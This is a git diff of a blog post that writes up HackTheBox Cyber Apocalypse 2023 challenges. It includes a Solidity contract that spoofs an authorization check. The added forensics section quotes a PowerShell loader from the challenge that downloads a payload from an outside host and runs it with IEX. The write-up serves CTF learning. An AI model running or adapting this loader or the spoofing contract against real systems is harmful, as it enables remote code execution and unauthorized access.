@@ -2,7 +2,7 @@
 author: Florian Idelberger
 title: CTF Writeup - HackTheBox - Cyber Apocalypse 2023
 date: 2023-03-24
-draft: true
+draft: false
 description: My writeup from participating in a bigger CTF
 ---
 
@@ -58,37 +58,37 @@ As you can see based on the `require` conditions, the can only be performed in t
 
 
 ```
-  1 contract ShootingArea {
-  4       bool public firstShot;
-    1     bool public secondShot;
-    2     bool public thirdShot;
-    3
-    4     modifier firstTarget() {
-    5         require(!firstShot && !secondShot && !thirdShot);
-    6         _;
-    7     }
-    8
-    9     modifier secondTarget() {
-   10         require(firstShot && !secondShot && !thirdShot);
-   11         _;
-   12     }
-   13
-   14     modifier thirdTarget() {
-   15         require(firstShot && secondShot && !thirdShot);
-   16         _;
-   17     }
-   18
-   19     receive() external payable secondTarget {
-   20         secondShot = true;
-   21     }
-   22
-   23     fallback() external payable firstTarget {
-   24         firstShot = true;
-   25     }
-   26
-   27     function third() public thirdTarget {
-   28         thirdShot = true;
-   29     }
+  contract ShootingArea {
+     bool public firstShot;
+     bool public secondShot;
+     bool public thirdShot;
+
+     modifier firstTarget() {
+         require(!firstShot && !secondShot && !thirdShot);
+         _;
+     }
+
+     modifier secondTarget() {
+         require(firstShot && !secondShot && !thirdShot);
+         _;
+     }
+
+     modifier thirdTarget() {
+         require(firstShot && secondShot && !thirdShot);
+         _;
+     }
+
+     receive() external payable secondTarget {
+         secondShot = true;
+     }
+
+     fallback() external payable firstTarget {
+         firstShot = true;
+     }
+
+     function third() public thirdTarget {
+         thirdShot = true;      }
+
 ```
 
 For the first target, you had to trigger the fallback function. This meant that you f.e. send a transaction with a function signature that is not defined (or some other conditions that you could check in the docs). For the second target, you had to send an arbitrary amount of Ether, thereby triggering the `receive()` function. The third one was then a normal function call transaction if I remember correctly. Then again get the flag from netcat.
@@ -98,38 +98,38 @@ For the first target, you had to trigger the fallback function. This meant that 
 This one was labeled as one difficulty higher, but still only easy. Embarrassingly, this gave me more trouble than I would have thought. The target contract implements an authorization procedure and provides an external interface `Entrant`. While I briefly thought that maybe string comparison could somehow be broken, this is unlikely and definitely not easy. So I quickly decided that the external interface has to be the likely target, as there were no other likely options and why else would it be implemented as interface with an external function. Admittedly, I was a bit hesitant to start on it at first, because implementing the interface in another contract would mean that I would actually have to write code. ^^
 
 ```
-pragma solidity ^0.8.18; // W: SPDX license identifier not provided in source file. Before publishing, consider adding a comme…
-    1
-    2
-    3 interface Entrant {
-    4     function name() external returns (string memory);
-    5 }
-    6
-    7 contract HighSecurityGate {
-    8
-    9     string[] private authorized = ["Orion", "Nova", "Eclipse"];
-   10     string public lastEntrant;
-   11
-   12     function enter() external {
-   13         Entrant _entrant = Entrant(msg.sender);
-   14
-   15         require(_isAuthorized(_entrant.name()), "Intruder detected");
-   16         lastEntrant = _entrant.name();
-   17     }
-   18
-   19     function _isAuthorized(string memory _user) private view returns (bool){
-   20         for (uint i; i < authorized.length; i++){
-   21             if (strcmp(_user, authorized[i])){
-   22                 return true;
-   23             }
-   24         }
-   25         return false;
-   26     }
-   27
-   28     function strcmp(string memory _str1, string memory _str2) public pure returns (bool){
-   29         return keccak256(abi.encodePacked(_str1)) == keccak256(abi.encodePacked(_str2));
-   30     }
-   31 }
+pragma solidity ^0.8.18;
+
+
+ interface Entrant {
+     function name() external returns (string memory);
+ }
+
+ contract HighSecurityGate {
+
+     string[] private authorized = ["Orion", "Nova", "Eclipse"];
+     string public lastEntrant;
+
+     function enter() external {
+         Entrant _entrant = Entrant(msg.sender);
+
+         require(_isAuthorized(_entrant.name()), "Intruder detected");
+         lastEntrant = _entrant.name();
+     }
+
+     function _isAuthorized(string memory _user) private view returns (bool){
+         for (uint i; i < authorized.length; i++){
+             if (strcmp(_user, authorized[i])){
+                 return true;
+             }
+         }
+         return false;
+     }
+
+     function strcmp(string memory _str1, string memory _str2) public pure returns (bool){
+         return keccak256(abi.encodePacked(_str1)) == keccak256(abi.encodePacked(_str2));
+     }
+ }
 ```
 
 In a new contract, I then implmented EntrantFake, which instantiates the target contract to be able to call it and implements the Entrant interface and the name function for it.
@@ -140,62 +140,63 @@ The main thing that took me way too long was - I was at first conviced that if d
 By implementing this malicious name function and then calling the enter function in the target contract, the malicious name is then used as part of the target contract.
 
 ```
---1   pragma solidity ^0.8.18; // W: SPDX license identifier not provided in source file. Before publishing, consider adding a comme…
-       // W: SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing "SPDX-Lice…
-    1
-    2 import {HighSecurityGate, Entrant} from "./FortifiedPerimeter.sol";
-    3
-    4 contract EntrantFake is Entrant {
-    5
-    6     HighSecurityGate contractInstance = HighSecurityGate(0x50003d99be68c8C270dC1dD00aD42A277dfC6B8c);
-    7     uint i = 0;
-    8
-    9     function name() external override returns (string memory) {
-   10         string memory b = "";
-   11         if (i  == 0) {
-   12         b = "Orion";
-   13         i = i + 1;
-   14         } else {
-   15         b = "Pandora";
-   16         }
-   17         return b;
-   18     }
-   19
-   20     function test() external {
-   21     contractInstance.enter();
-   22
-   23     }
-   24 }
+pragma solidity ^0.8.18;
+
+import {HighSecurityGate, Entrant} from "./FortifiedPerimeter.sol";
+
+contract EntrantFake is Entrant {
+
+   HighSecurityGate contractInstance = HighSecurityGate(0x50003d99be68c8C270dC1dD00aD42A277dfC6B8c);
+   uint i = 0;
+   function name() external override returns (string memory) {
+         string memory b = "";
+         if (i  == 0) {
+         b = "Orion";
+         i = i + 1;
+         } else {
+         b = "Pandora";
+         }
+         return b;
+     }
+
+     function test() external {
+     contractInstance.enter();
+
+     }
+ }
 ```
    
-   Once lastEntrant is set, the flag could then be retrieved from the webservice. For trying different solutions, remix-ide and its virtual chain was very helpful. Really the best way to try these is with remix-ide.
+   Once `lastEntrant` is set, the flag could then be retrieved from the web service. For trying different solutions, remix-ide and its virtual chain were very helpful. Really the best way to try these is with remix-ide.
    
-Interesting addendum - because at first I thought there must be some way to do this without returning different things via name(), I researched a bit and asked ChatGPT. As I hear that's a thing these days. TBH, I was not impressed - especially on the Solidity code, it frequently gave just plain wrong answers and 
+Interesting addendum - because at first, I thought there must be some way to do this without returning different things via name(), I researched a bit and asked ChatGPT. As I hear, that's a thing these days. TBH, I was not impressed - especially on the Solidity code. It frequently gave just plain wrong answers and or said one right thing mixed with wrong ones, and often even did not remember when I told it that something was wrong.
 
 ## Reversing - Needle in a haystack
 
-This challenge gave you a binary to analyze. However, it was not even necessary to disassemble it or similar, as you could just past it to the `strings` utility, which then shows you all strings in the binary, including the flag needed to complete the challenge.
+This challenge gave you a binary to analyze. However, it was not even necessary to disassemble it or similar, as you could just pass it to the `strings` utility, which then shows you all strings in the binary, including the flag needed to complete the challenge.
 
 ## Forensics - Alien Cradle
 
-This challenge gave you a power shell script. In case you executed it, which would of course be a bad idea in most cases, it rickrolled you by opening the requisite video in your browser.
-When actually looking at the source, it was immediately obvious that the flag was just being cocatenated. These separate parts could then just be pierced together. 
+This challenge gave you a PowerShell script. In case you executed it, which would, of course, be a bad idea in most cases, it rickrolled you by opening the requisite video in your browser. However, I learned that there is also PowerShell for Linux and macOS, which was new to me.
+
+```if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -ne 'secret_HQ\Arth'){exit};$w = New-Object net.webclient;$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;$d = $w.DownloadString('http://windowsliveupdater.com/updates/33' + '96f3bf5a605cc4' + '1bd0d6e229148' + '2a5/2_34122.gzip.b64');$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String($d));$f = 'H' + 'T' + 'B' + '{p0w3rs' + 'h3ll' + '_Cr4d' + 'l3s_c4n_g3t' + '_th' + '3_j0b_d' + '0n3}';IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();```
+
+When actually looking at the source, it was immediately obvious that the flag was just being concatenated. These separate parts could then just be pierced together. 
 
 ## Hardware - Critical Flight
 
-This challenge gave you a set of gerber files, to open with a PCB design or viewing tool. These were not hidden in any way or similar, so if you knew or could somehow figure out with which tool to open them, this was really easy and quick. I just openend them with gerberview from KiCad, and the just went through each layers, where two of the contained one part of the flag each.
+This challenge gave you a set of Gerber files to open with a PCB design or viewing tool. These were not hidden in any way or similar, so if you knew or could somehow figure out with which tool to open them, this was really easy and quick. I just opened them with gerberview from KiCad, and then just went through each layer, where two of the contained one part of the flag each.
 
-![](kicad.png)
+![](static/images/kicad.png)
 
 # Partial Solves
 
-I think some I solved at least partially. Of those, I share the ones that I find more interesting.
+I think I solved some at least partially. Of those, I wanted to share at least the ones that I found most interesting. These will be added soon.
 
 ## Reversing - Hunting License Partial Solve
 
-Because I got relatively far (I think) and I like this challenge, I wanted to include it anyway.
+
 
 ## Reversing - C Shells
 
-## HW - Timed Transmission
+## Hardware - Timed Transmission
 
